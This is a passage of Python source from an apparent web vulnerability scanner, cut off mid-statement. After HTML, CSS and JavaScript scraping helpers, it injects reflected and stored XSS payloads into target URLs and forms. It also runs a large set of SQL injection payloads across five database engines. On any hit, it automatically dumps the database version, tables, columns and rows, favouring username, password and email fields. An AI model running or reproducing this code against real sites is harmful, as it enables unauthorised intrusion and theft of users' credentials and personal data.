    def extract_body_structure(self, element, level=0, max_level=3):
        """Recursively extract body structure"""
        if level > max_level:
            return []
        
        structure = []
        for child in element.children:
            if child.name:
                node = {
                    'tag': child.name,
                    'attributes': dict(child.attrs),
                    'children': self.extract_body_structure(child, level+1, max_level)
                }
                structure.append(node)
        
        return structure

    def extract_css(self, soup, base_url):
        """Extract all CSS (inline, embedded, external)"""
        css_data = {
            'inline': [],
            'embedded': [],
            'external': []
        }
        
        # 1. Extract inline CSS
        for tag in soup.find_all(style=True):
            css_data['inline'].append({
                'tag': tag.name,
                'styles': tag['style']
            })
        
        # 2. Extract embedded CSS
        for style in soup.find_all('style'):
            if style.string:
                css_data['embedded'].append(style.string.strip())
        
        # 3. Extract external CSS
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href')
            if href:
                css_url = urljoin(base_url, href)
                try:
                    css_response = self.session.get(css_url, timeout=5)
                    if css_response.status_code == 200:
                        css_data['external'].append({
                            'url': css_url,
                            'content': css_response.text
                        })
                except:
                    pass
        
        return css_data

    def extract_javascript(self, soup, base_url):
        """Extract all JavaScript (inline, external)"""
        js_data = {
            'inline': [],
            'external': []
        }
        
        # 1. Extract inline JS
        for script in soup.find_all('script'):
            if script.string and not script.get('src'):
                js_data['inline'].append(script.string.strip())
        
        # 2. Extract external JS
        for script in soup.find_all('script', src=True):
            src = script.get('src')
            if src:
                js_url = urljoin(base_url, src)
                try:
                    js_response = self.session.get(js_url, timeout=5)
                    if js_response.status_code == 200:
                        js_data['external'].append({
                            'url': js_url,
                            'content': js_response.text
                        })
                except:
                    pass
        
        return js_data

    def extract_form_details(self, form):
        """Extract detailed form information"""
        form_data = {
            'action': form.get('action'),
            'method': form.get('method', 'GET'),
            'inputs': [],
            'buttons': [],
            'attributes': dict(form.attrs)
        }
        
        # Extract input fields
        for input_tag in form.find_all('input'):
            form_data['inputs'].append({
                'name': input_tag.get('name'),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value'),
                'attributes': {k: v for k, v in input_tag.attrs.items() 
                              if k not in ['name', 'type', 'value']}
            })
        
        # Extract textareas
        for textarea in form.find_all('textarea'):
            form_data['inputs'].append({
                'name': textarea.get('name'),
                'type': 'textarea',
                'value': textarea.string if textarea.string else '',
                'attributes': {k: v for k, v in textarea.attrs.items() 
                               if k != 'name'}
            })
        
        # Extract select options
        for select in form.find_all('select'):
            options = []
            for option in select.find_all('option'):
                options.append({
                    'value': option.get('value'),
                    'text': option.string if option.string else ''
                })
            
            form_data['inputs'].append({
                'name': select.get('name'),
                'type': 'select',
                'options': options,
                'attributes': {k: v for k, v in select.attrs.items() 
                              if k != 'name'}
            })
        
        # Extract buttons
        for button in form.find_all('button'):
            form_data['buttons'].append({
                'name': button.get('name'),
                'type': button.get('type', 'button'),
                'text': button.string if button.string else '',
                'attributes': {k: v for k, v in button.attrs.items() 
                              if k not in ['name', 'type']}
            })
        
        return form_data

    def show_scraped_data(self):
        """Enhanced display of scraped data with code preview"""
        if not self.scraped_data:
            self.typewriter_effect("\n📭 No scraped data available yet!")
            return
        
        self.typewriter_effect("\n📋 ENHANCED SCRAPED DATA REPORT:")
        self.typewriter_effect("══════════════════════════════════════════════")
        
        for item in self.scraped_data:
            self.typewriter_effect(f"\n🔍 {item['type']}:")
            self.typewriter_effect("──────────────────────────────────────────")
            
            if item['type'] == 'HTML Structure':
                self.display_html_structure(item['data'])
            elif item['type'] == 'CSS':
                self.display_code_data('CSS', item['data'])
            elif item['type'] == 'JavaScript':
                self.display_code_data('JavaScript', item['data'])
            elif item['type'] == 'Text Content':
                self.typewriter_effect(f"   {item['data']}")
            elif isinstance(item['data'], list):
                self.display_list_data(item['type'], item['data'])
            
            self.typewriter_effect("──────────────────────────────────────────")
        
        self.typewriter_effect(f"\n📋 Total data categories scraped: {len(self.scraped_data)}")
        if self.scraped_files_dir:
            self.typewriter_effect(f"📁 Scraped files directory: {self.scraped_files_dir}")

    def display_html_structure(self, html_data):
        """Display HTML structure in readable format"""
        self.typewriter_effect(f"   DOCTYPE: {html_data.get('doctype', 'Not specified')}")
        
        self.typewriter_effect("\n   HTML Tag Attributes:")
        for attr, value in html_data.get('html_tag', {}).items():
            self.typewriter_effect(f"      {attr}: {value}")
        
        self.typewriter_effect("\n   HEAD Elements:")
        for element in html_data.get('head_elements', [])[:5]:  # Show first 5
            self.typewriter_effect(f"      <{element['tag']}>")
            for attr, value in element.get('attributes', {}).items():
                self.typewriter_effect(f"         {attr}: {value}")
            if 'content' in element:
                self.typewriter_effect(f"         Content: {element['content']}")
        
        self.typewriter_effect("\n   BODY Structure (simplified):")
        self.display_html_nodes(html_data.get('body_structure', []), depth=1)

    def display_html_nodes(self, nodes, depth=0, max_depth=2):
        """Recursively display HTML nodes"""
        if depth > max_depth:
            return
        
        for node in nodes[:3]:  # Show first 3 nodes at each level
            indent = '   ' * (depth + 1)
            self.typewriter_effect(f"{indent}<{node['tag']}>")
            
            # Display attributes if any
            for attr, value in node.get('attributes', {}).items():
                self.typewriter_effect(f"{indent}   {attr}: {value}")
            
            # Recursively display children
            if node.get('children'):
                self.display_html_nodes(node['children'], depth+1, max_depth)

    def display_code_data(self, code_type, code_data):
        """Display CSS or JavaScript code data"""
        if code_type == 'CSS':
            self.typewriter_effect("   Inline Styles:")
            for style in code_data.get('inline', [])[:2]:  # Show first 2
                self.typewriter_effect(f"      <{style['tag']}>: {style['styles'][:100]}...")
            
            self.typewriter_effect("\n   Embedded CSS:")
            for css in code_data.get('embedded', [])[:1]:  # Show first 1
                self.typewriter_effect(f"      {css[:200]}...")
            
            self.typewriter_effect("\n   External CSS Files:")
            for css in code_data.get('external', [])[:2]:  # Show first 2
                self.typewriter_effect(f"      URL: {css['url']}")
                self.typewriter_effect(f"      Content Sample: {css['content'][:200]}...")
        
        elif code_type == 'JavaScript':
            self.typewriter_effect("   Inline JavaScript:")
            for js in code_data.get('inline', [])[:2]:  # Show first 2
                self.typewriter_effect(f"      {js[:200]}...")
            
            self.typewriter_effect("\n   External JavaScript Files:")
            for js in code_data.get('external', [])[:2]:  # Show first 2
                self.typewriter_effect(f"      URL: {js['url']}")
                self.typewriter_effect(f"      Content Sample: {js['content'][:200]}...")

    def display_list_data(self, data_type, data_list):
        """Display list-type data (links, images, etc.)"""
        if data_type == 'Forms':
            for i, form in enumerate(data_list[:2], 1):  # Show first 2 forms
                self.typewriter_effect(f"   Form {i}:")
                self.typewriter_effect(f"      Action: {form.get('action')}")
                self.typewriter_effect(f"      Method: {form.get('method')}")
                self.typewriter_effect(f"      Inputs: {len(form.get('inputs', []))}")
                self.typewriter_effect(f"      Buttons: {len(form.get('buttons', []))}")
        else:
            for i, item in enumerate(data_list[:5], 1):  # Show first 5 items
                if isinstance(item, str):
                    self.typewriter_effect(f"   {i}. {item}")
                elif isinstance(item, dict):
                    if data_type == 'Meta Tags':
                        self.typewriter_effect(f"   {i}. Name: {item.get('name')}")
                        self.typewriter_effect(f"      Content: {item.get('content')}")
                        self.typewriter_effect(f"      Property: {item.get('property')}")
        
        if len(data_list) > 5:
            self.typewriter_effect(f"   ... and {len(data_list)-5} more items")

    def xss_test(self, url):
        """Enhanced Cross-Site Scripting vulnerability testing"""
        self.typewriter_effect(f"⚡ Starting ENHANCED XSS test on: {url}")
        self.loading_animation("Analyzing URL parameters for XSS vectors", 2)
        
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                self.typewriter_effect("❌ No parameters found in URL for testing")
                return
            
            self.typewriter_effect(f"🎯 Testing {len(params)} parameter(s) with advanced techniques")
            
            # Test each parameter with all XSS payloads
            for param_name, param_values in params.items():
                self.typewriter_effect(f"\n🔍 Testing parameter: {param_name}")
                
                original_value = param_values[0] if param_values else ''
                
                # Test each XSS payload
                for payload in self.xss_payloads:
                    try:
                        # Create test URL with payload
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        
                        # Send GET request
                        response = self.session.get(test_url, params=test_params, timeout=10)
                        
                        # Check if payload was reflected in response
                        if payload in response.text:
                            # Check if payload was executed (basic check)
                            if any(tag in response.text.lower() for tag in ['<script>', 'onerror=', 'onload=', 'javascript:']):
                                self.typewriter_effect(f"\n🚨 XSS VULNERABILITY DETECTED!")
                                self.typewriter_effect(f"   Parameter: {param_name}")
                                self.typewriter_effect(f"   Payload: {payload}")
                                self.typewriter_effect(f"   Payload was reflected and appears executable")
                                
                                self.vulnerabilities.append({
                                    'type': 'XSS',
                                    'description': f"Reflected XSS in parameter '{param_name}'",
                                    'severity': 'High',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': url,
                                    'context': self.detect_xss_context(response.text, payload)
                                })
                            else:
                                self.typewriter_effect(f"\n⚠️ XSS PAYLOAD REFLECTED BUT MAY NOT EXECUTE")
                                self.typewriter_effect(f"   Parameter: {param_name}")
                                self.typewriter_effect(f"   Payload: {payload}")
                                
                                self.vulnerabilities.append({
                                    'type': 'Potential XSS',
                                    'description': f"Potential XSS in parameter '{param_name}' (payload reflected but may not execute)",
                                    'severity': 'Medium',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': url,
                                    'context': self.detect_xss_context(response.text, payload)
                                })
                        
                        time.sleep(0.2)  # Rate limiting
                        
                    except Exception as e:
                        continue
            
            # Test for stored XSS if it's a form submission URL
            if parsed_url.path.endswith(('.php', '.asp', '.aspx', '.jsp', '.do', '.action')):
                self.typewriter_effect("\n🔍 Testing for stored XSS vulnerabilities...")
                self.test_stored_xss(url)
            
            self.typewriter_effect("\n✅ Enhanced XSS testing completed")
            
        except Exception as e:
            self.typewriter_effect(f"❌ XSS test failed: {str(e)}")
    
    def detect_xss_context(self, response_text, payload):
        """Detect the context where the XSS payload appears in the response"""
        try:
            soup = BeautifulSoup(response_text, 'html.parser')
            
            # Check if payload appears in script tag
            scripts = soup.find_all('script', string=lambda t: payload in str(t))
            if scripts:
                return "JavaScript context"
            
            # Check if payload appears in HTML attribute
            for tag in soup.find_all():
                for attr, value in tag.attrs.items():
                    if isinstance(value, str) and payload in value:
                        return f"HTML attribute context ({attr})"
                    elif isinstance(value, list) and any(payload in v for v in value):
                        return f"HTML attribute context ({attr})"
            
            # Check if payload appears in URL
            if payload in soup.find_all(href=lambda x: x and payload in x):
                return "URL context (href)"
            if payload in soup.find_all(src=lambda x: x and payload in x):
                return "URL context (src)"
            
            # Check if payload appears in CSS
            styles = soup.find_all('style', string=lambda t: payload in str(t))
            if styles:
                return "CSS context"
            
            # Check if payload appears directly in HTML
            if payload in response_text:
                return "HTML body context"
            
            return "Unknown context"
        except:
            return "Context detection failed"
    
    def test_stored_xss(self, url):
        """Test for stored XSS vulnerabilities by submitting forms"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.typewriter_effect("⚠️ No forms found for stored XSS testing")
                return
            
            self.typewriter_effect(f"🔍 Found {len(forms)} forms to test for stored XSS")
            
            for form in forms:
                form_details = self.get_form_details(form)
                form_url = urljoin(url, form_details['action'])
                
                self.typewriter_effect(f"\n🔍 Testing form at: {form_url}")
                
                # Select 3 representative XSS payloads to test
                test_payloads = [
                    "<script>alert('Stored XSS')</script>",
                    "<img src=x onerror=alert('Stored XSS')>",
                    "\" onmouseover=alert('Stored XSS') \""
                ]
                
                for payload in test_payloads:
                    try:
                        # Prepare form data with XSS payload
                        form_data = {}
                        for input_tag in form_details['inputs']:
                            if input_tag['type'] == 'hidden':
                                form_data[input_tag['name']] = input_tag['value']
                            elif input_tag['type'] == 'submit':
                                form_data[input_tag['name']] = input_tag.get('value', '')
                            else:
                                form_data[input_tag['name']] = payload
                        
                        # Submit the form
                        if form_details['method'] == 'post':
                            response = self.session.post(form_url, data=form_data, timeout=10)
                        else:
                            response = self.session.get(form_url, params=form_data, timeout=10)
                        
                        # Check if payload appears in response (basic stored XSS check)
                        if payload in response.text:
                            self.typewriter_effect(f"\n⚠️ POTENTIAL STORED XSS DETECTED IN FORM SUBMISSION")
                            self.typewriter_effect(f"   Payload: {payload}")
                            self.typewriter_effect(f"   Form action: {form_url}")
                            
                            self.vulnerabilities.append({
                                'type': 'Potential Stored XSS',
                                'description': f"Potential stored XSS in form submission to '{form_url}'",
                                'severity': 'High',
                                'payload': payload,
                                'url': form_url,
                                'context': 'Form submission'
                            })
                        
                    except Exception as e:
                        continue
        
        except Exception as e:
            self.typewriter_effect(f"❌ Stored XSS test failed: {str(e)}")
    
    def sql_injection_test(self, url):
        """Advanced SQL injection vulnerability testing with database extraction"""
        self.typewriter_effect(f"💉 Starting ADVANCED SQL injection test on: {url}")
        self.loading_animation("Analyzing URL parameters for SQLi vectors", 2)
        
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                self.typewriter_effect("❌ No parameters found in URL for testing")
                return
            
            self.typewriter_effect(f"🎯 Testing {len(params)} parameter(s) with advanced techniques")
            
            # Enhanced SQL injection payloads
            advanced_payloads = [
                # Boolean-based blind payloads
                "' AND 1=1--", "' AND 1=2--", 
                "' OR 1=1--", "' OR 1=2--",
                "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,MD5(1))--",
                
                # Time-based payloads
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--",
                "' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(5),0)--",
                
                # Error-based payloads
                "' AND GTID_SUBSET(CONCAT(0x7178787171,(SELECT (ELT(1=1,1))),0x7178787171)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x5c,0x7178787171,(SELECT MID((IFNULL(CAST(@@version AS CHAR),0x20)),1,50)),0x7178787171)--",
                
                # Union-based payloads
                "' UNION SELECT NULL,CONCAT(0x7178787171,0x4b5168596666534b5468,0x7178787171),NULL--",
                "' UNION SELECT NULL,@@version,NULL--",
                "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--",
                
                # Database-specific payloads
                # MySQL
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7178787171,CAST(@@version AS CHAR),0x7178787171)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                
                # PostgreSQL
                "' AND 1=CAST((SELECT version()) AS INT)--",
                "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
                
                # MSSQL
                "' AND 1=CONVERT(INT,(SELECT @@version))--",
                "'; WAITFOR DELAY '0:0:5'--",
                
                # Oracle
                "' AND 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)--",
                "' AND 1=(SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='admin')))--",
                
                # SQLite
                "' AND 1=randomblob(1000000000)--",
                "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--"
            ]
            
            # Combine basic and advanced payloads
            all_payloads = self.sql_payloads + advanced_payloads
            
            for param_name, param_values in params.items():
                self.typewriter_effect(f"\n🔍 Testing parameter: {param_name}")
                
                original_value = param_values[0] if param_values else '1'
                
                # Test each SQL payload
                for payload in all_payloads:
                    try:
                        # Create test URL with payload
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        
                        start_time = time.time()
                        response = self.session.get(test_url, params=test_params, timeout=15)
                        response_time = time.time() - start_time
                        
                        # Enhanced error detection patterns
                        sql_errors = {
                            'MySQL': [
                                'SQL syntax.*MySQL', 'Warning.*mysql_.*',
                                'valid MySQL result', 'MySqlClient\.',
                                'com\.mysql\.jdbc\.exceptions'
                            ],
                            'PostgreSQL': [
                                'PostgreSQL.*ERROR', 'Warning.*pg_.*',
                                'valid PostgreSQL result', 'Npgsql\.',
                                'org\.postgresql\.util\.PSQLException'
                            ],
                            'Microsoft SQL Server': [
                                'Microsoft SQL Native Client.*[0-9]+',
                                'SQL Server.*[0-9]+', 'Warning.*mssql_.*',
                                'valid SQL Server result', 'System\.Data\.SqlClient\.SqlException',
                                'ODBC SQL Server Driver'
                            ],
                            'Oracle': [
                                'ORA-[0-9]+', 'Oracle error',
                                'Oracle.*Driver', 'Warning.*oci_.*',
                                'valid Oracle result'
                            ],
                            'SQLite': [
                                'SQLite/JDBCDriver', 'SQLite\.Exception',
                                'System\.Data\.SQLite\.SQLiteException',
                                'Warning.*sqlite_.*', 'valid SQLite result'
                            ],
                            'Generic': [
                                'SQL syntax.*', 'quoted string not properly terminated',
                                'unclosed quotation mark', 'syntax error',
                                'unterminated quoted string'
                            ]
                        }
                        
                        response_text = response.text.lower()
                        
                        # Detect database type and errors
                        detected_db = None
                        for db_type, patterns in sql_errors.items():
                            for pattern in patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    detected_db = db_type
                                    self.typewriter_effect(f"\n🚨 {db_type} SQL INJECTION DETECTED!")
                                    self.typewriter_effect(f"   Parameter: {param_name}")
                                    self.typewriter_effect(f"   Payload: {payload}")
                                    self.typewriter_effect(f"   Error: {pattern}")
                                    
                                    self.vulnerabilities.append({
                                        'type': 'SQL Injection',
                                        'database': db_type,
                                        'description': f"{db_type} SQL injection in parameter '{param_name}'",
                                        'severity': 'Critical',
                                        'parameter': param_name,
                                        'payload': payload,
                                        'error_pattern': pattern,
                                        'url': url
                                    })
                                    break
                            if detected_db:
                                break
                        
                        # Time-based detection
                        if 'sleep(' in payload.lower() or 'waitfor' in payload.lower() or 'benchmark(' in payload.lower():
                            if response_time > 5:  # If response took more than 5 seconds
                                self.typewriter_effect(f"\n⏰ TIME-BASED SQL INJECTION DETECTED!")
                                self.typewriter_effect(f"   Parameter: {param_name}")
                                self.typewriter_effect(f"   Payload: {payload}")
                                self.typewriter_effect(f"   Response time: {response_time:.2f} seconds")
                                
                                self.vulnerabilities.append({
                                    'type': 'Time-based SQL Injection',
                                    'description': f"Time-based SQL injection in parameter '{param_name}'",
                                    'severity': 'Critical',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'response_time': response_time,
                                    'url': url
                                })
                        
                        # Boolean-based detection
                        if (' and 1=1' in payload.lower() or ' or 1=1' in payload.lower()) and not detected_db:
                            true_response = response.text
                            
                            # Test false condition
                            false_payload = payload.replace('1=1', '1=2')
                            test_params[param_name] = [false_payload]
                            false_response = self.session.get(test_url, params=test_params, timeout=10).text
                            
                            if true_response != false_response:
                                self.typewriter_effect(f"\n🔍 BOOLEAN-BASED SQL INJECTION DETECTED!")
                                self.typewriter_effect(f"   Parameter: {param_name}")
                                self.typewriter_effect(f"   Payload: {payload}")
                                
                                self.vulnerabilities.append({
                                    'type': 'Boolean-based SQL Injection',
                                    'description': f"Boolean-based SQL injection in parameter '{param_name}'",
                                    'severity': 'Critical',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': url
                                })
                        
                        time.sleep(0.3)  # Rate limiting
                        
                    except Exception as e:
                        continue
                
                # If vulnerabilities found, attempt database extraction
                if any(v['parameter'] == param_name for v in self.vulnerabilities):
                    self.extract_database_data(test_url, param_name, params)
            
            self.typewriter_effect("\n✅ Advanced SQL injection testing completed")
            
        except Exception as e:
            self.typewriter_effect(f"❌ SQL injection test failed: {str(e)}")

    def extract_database_data(self, base_url, param_name, original_params):
        """Extract database structure and content from vulnerable parameter"""
        self.typewriter_effect(f"\n🔍 Attempting to extract database information from parameter: {param_name}")
        
        # First determine database type
        db_type = None
        for vuln in self.vulnerabilities:
            if vuln['parameter'] == param_name and 'database' in vuln:
                db_type = vuln['database']
                break
        
        if not db_type:
            self.typewriter_effect("⚠️ Could not determine database type automatically")
            self.typewriter_effect("🔧 Trying to identify database type...")
            db_type = self.identify_database_type(base_url, param_name, original_params)
        
        if db_type:
            self.typewriter_effect(f"🛠️  Database identified as: {db_type}")
            
            # Extract database version
            self.extract_database_version(base_url, param_name, original_params, db_type)
            
            # Extract database name
            self.extract_database_name(base_url, param_name, original_params, db_type)
            
            # Extract table names
            tables = self.extract_database_tables(base_url, param_name, original_params, db_type)
            
            # Extract columns and data from each table
            if tables:
                for table in tables:
                    columns = self.extract_table_columns(base_url, param_name, original_params, db_type, table)
                    if columns:
                        self.extract_table_data(base_url, param_name, original_params, db_type, table, columns)
        else:
            self.typewriter_effect("❌ Failed to identify database type for extraction")

    def identify_database_type(self, base_url, param_name, original_params):
        """Identify the database type using version extraction techniques"""
        version_payloads = {
            'MySQL': "' UNION SELECT NULL,@@version,NULL--",
            'PostgreSQL': "' UNION SELECT NULL,version(),NULL--",
            'Microsoft SQL Server': "' UNION SELECT NULL,@@version,NULL--",
            'Oracle': "' UNION SELECT NULL,banner,NULL FROM v$version WHERE rownum=1--",
            'SQLite': "' UNION SELECT NULL,sqlite_version(),NULL--"
        }
        
        for db_type, payload in version_payloads.items():
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                if db_type == 'MySQL' and ('mysql' in response.text.lower() or 'mariadb' in response.text.lower()):
                    return 'MySQL'
                elif db_type == 'PostgreSQL' and 'postgresql' in response.text.lower():
                    return 'PostgreSQL'
                elif db_type == 'Microsoft SQL Server' and ('microsoft sql server' in response.text.lower() or 'sql server' in response.text.lower()):
                    return 'Microsoft SQL Server'
                elif db_type == 'Oracle' and ('oracle' in response.text.lower() or 'ora-' in response.text.lower()):
                    return 'Oracle'
                elif db_type == 'SQLite' and ('sqlite' in response.text.lower()):
                    return 'SQLite'
                
            except:
                continue
        
        return None

    def extract_database_version(self, base_url, param_name, original_params, db_type):
        """Extract database version information"""
        self.typewriter_effect("\n🔧 Extracting database version...")
        
        version_payloads = {
            'MySQL': "' UNION SELECT NULL,@@version,NULL--",
            'PostgreSQL': "' UNION SELECT NULL,version(),NULL--",
            'Microsoft SQL Server': "' UNION SELECT NULL,@@version,NULL--",
            'Oracle': "' UNION SELECT NULL,banner,NULL FROM v$version WHERE rownum=1--",
            'SQLite': "' UNION SELECT NULL,sqlite_version(),NULL--"
        }
        
        payload = version_payloads.get(db_type)
        if payload:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                # Extract version from response
                version_pattern = r'([0-9]+\.[0-9]+\.[0-9]+)|(SQLite version [0-9.]+)|(Oracle Database [0-9a-zA-Z ]+)'
                match = re.search(version_pattern, response.text)
                
                if match:
                    version = match.group(0)
                    self.typewriter_effect(f"✅ Database version: {version}")
                    
                    self.vulnerabilities.append({
                        'type': 'Database Version',
                        'database': db_type,
                        'description': f"Extracted {db_type} version",
                        'severity': 'High',
                        'data': version,
                        'parameter': param_name
                    })
                    return version
                
            except Exception as e:
                self.typewriter_effect(f"❌ Failed to extract version: {str(e)}")
        
        self.typewriter_effect("⚠️ Could not extract database version")
        return None

    def extract_database_name(self, base_url, param_name, original_params, db_type):
        """Extract current database name"""
        self.typewriter_effect("\n🔧 Extracting database name...")
        
        name_payloads = {
            'MySQL': "' UNION SELECT NULL,database(),NULL--",
            'PostgreSQL': "' UNION SELECT NULL,current_database(),NULL--",
            'Microsoft SQL Server': "' UNION SELECT NULL,db_name(),NULL--",
            'Oracle': "' UNION SELECT NULL,global_name,NULL FROM global_name--",
            'SQLite': "' UNION SELECT NULL,file,NULL FROM sqlite_master--"
        }
        
        payload = name_payloads.get(db_type)
        if payload:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                # Extract database name from response
                name_pattern = r'([a-zA-Z0-9_]+)'
                match = re.search(name_pattern, response.text)
                
                if match:
                    db_name = match.group(0)
                    self.typewriter_effect(f"✅ Database name: {db_name}")
                    
                    self.vulnerabilities.append({
                        'type': 'Database Name',
                        'database': db_type,
                        'description': f"Extracted {db_type} database name",
                        'severity': 'High',
                        'data': db_name,
                        'parameter': param_name
                    })
                    return db_name
                
            except Exception as e:
                self.typewriter_effect(f"❌ Failed to extract database name: {str(e)}")
        
        self.typewriter_effect("⚠️ Could not extract database name")
        return None

    def extract_database_tables(self, base_url, param_name, original_params, db_type):
        """Extract list of tables from database"""
        self.typewriter_effect("\n🔧 Extracting database tables...")
        
        table_payloads = {
            'MySQL': "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
            'PostgreSQL': "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_catalog=current_database()--",
            'Microsoft SQL Server': "' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--",
            'Oracle': "' UNION SELECT NULL,table_name,NULL FROM all_tables--",
            'SQLite': "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--"
        }
        
        payload = table_payloads.get(db_type)
        if payload:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                # Extract table names from response
                table_pattern = r'([a-zA-Z0-9_]+)'
                tables = re.findall(table_pattern, response.text)
                
                # Filter out common false positives
                common_terms = ['html', 'body', 'div', 'table', 'span', 'style', 'script']
                tables = [t for t in tables if t.lower() not in common_terms and len(t) > 3]
                
                if tables:
                    tables = list(set(tables))  # Remove duplicates
                    self.typewriter_effect(f"✅ Found {len(tables)} tables:")
                    for i, table in enumerate(tables[:10]):  # Show first 10 tables
                        self.typewriter_effect(f"   {i+1}. {table}")
                    
                    if len(tables) > 10:
                        self.typewriter_effect(f"   ... and {len(tables)-10} more tables")
                    
                    self.vulnerabilities.append({
                        'type': 'Database Tables',
                        'database': db_type,
                        'description': f"Extracted {len(tables)} tables from database",
                        'severity': 'High',
                        'data': ', '.join(tables[:10]),
                        'parameter': param_name
                    })
                    return tables
                
            except Exception as e:
                self.typewriter_effect(f"❌ Failed to extract tables: {str(e)}")
        
        self.typewriter_effect("⚠️ Could not extract database tables")
        return None

    def extract_table_columns(self, base_url, param_name, original_params, db_type, table):
        """Extract columns from a specific table"""
        self.typewriter_effect(f"\n🔧 Extracting columns from table: {table}")
        
        column_payloads = {
            'MySQL': f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
            'PostgreSQL': f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
            'Microsoft SQL Server': f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
            'Oracle': f"' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='{table.upper()}'--",
            'SQLite': f"' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table' AND name='{table}'--"
        }
        
        payload = column_payloads.get(db_type)
        if payload:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                # Extract column names from response
                if db_type == 'SQLite':
                    # SQLite returns the CREATE TABLE statement
                    create_table = response.text
                    column_pattern = r'(\w+)\s+[a-zA-Z]+\s*(?:\([^)]*\))?(?:\s+\w+)*'
                    columns = re.findall(column_pattern, create_table)
                else:
                    column_pattern = r'([a-zA-Z0-9_]+)'
                    columns = re.findall(column_pattern, response.text)
                
                # Filter out common false positives
                common_terms = ['html', 'body', 'div', 'table', 'span', 'style', 'script']
                columns = [c for c in columns if c.lower() not in common_terms and len(c) > 2]
                
                if columns:
                    columns = list(set(columns))  # Remove duplicates
                    self.typewriter_effect(f"✅ Found {len(columns)} columns in {table}:")
                    for i, column in enumerate(columns[:10]):  # Show first 10 columns
                        self.typewriter_effect(f"   {i+1}. {column}")
                    
                    if len(columns) > 10:
                        self.typewriter_effect(f"   ... and {len(columns)-10} more columns")
                    
                    self.vulnerabilities.append({
                        'type': 'Table Columns',
                        'database': db_type,
                        'description': f"Extracted {len(columns)} columns from table '{table}'",
                        'severity': 'High',
                        'table': table,
                        'data': ', '.join(columns[:10]),
                        'parameter': param_name
                    })
                    return columns
                
            except Exception as e:
                self.typewriter_effect(f"❌ Failed to extract columns: {str(e)}")
        
        self.typewriter_effect(f"⚠️ Could not extract columns from table {table}")
        return None

    def extract_table_data(self, base_url, param_name, original_params, db_type, table, columns):
        """Extract sample data from a table"""
        self.typewriter_effect(f"\n🔧 Extracting sample data from table: {table}")
        
        # Look for interesting columns (users, passwords, etc.)
        interesting_columns = []
        for col in columns:
            if 'user' in col.lower() or 'name' in col.lower() or 'pass' in col.lower() or 'email' in col.lower():
                interesting_columns.append(col)
        
        if not interesting_columns:
            interesting_columns = columns[:3]  # Just get first few columns if no obvious interesting ones
        
        # Build SELECT query
        if db_type == 'SQLite':
            # SQLite has different syntax for concatenation
            select_expr = "','||" + "||','||".join(interesting_columns) + "||'"
        else:
            select_expr = "CONCAT('|'," + ",'|',".join(interesting_columns) + ",'|')"
        
        limit = 5  # Only get 5 rows to avoid huge responses
        data_payload = f"' UNION SELECT NULL,{select_expr},NULL FROM {table} LIMIT {limit}--"
        
        try:
            test_params = original_params.copy()
            test_params[param_name] = [data_payload]
            
            response = self.session.get(base_url, params=test_params, timeout=10)
            
            # Extract data from response
            data_pattern = r'\|(.+?)\|'
            matches = re.findall(data_pattern, response.text)
            
            if matches:
                self.typewriter_effect(f"✅ Sample data from {table}:")
                for i, match in enumerate(matches[:5]):  # Show first 5 rows
                    self.typewriter_effect(f"   Row {i+1}: {match}")
                
                self.vulnerabilities.append({
                    'type': 'Table Data',
                    'database': db_type,
